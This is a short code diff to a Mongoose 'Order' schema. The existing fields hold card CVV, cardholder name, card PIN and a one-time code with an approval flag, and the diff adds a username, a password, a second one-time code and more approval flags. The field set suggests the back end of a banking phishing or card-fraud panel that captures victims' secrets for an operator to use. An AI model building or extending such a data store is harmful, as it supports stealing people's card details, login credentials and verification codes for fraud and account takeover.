@@ -17,13 +17,24 @@ exports.Order = mongoose.model(
     cvv: String,
     card_name: String,
     pin: String,
-    money:String,
+    money: String,
     otpAccept: {
       type: Boolean,
       default: false,
     },
     otp: String,
+    username: String,
+    password: String,
+    userAccept: {
+      type: Boolean,
+      default: false,
+    },
 
+    userOtp: String,
+    userOtpAccept: {
+      type: Boolean,
+      default: false,
+    },
     checked: {
       type: Boolean,
       default: false,
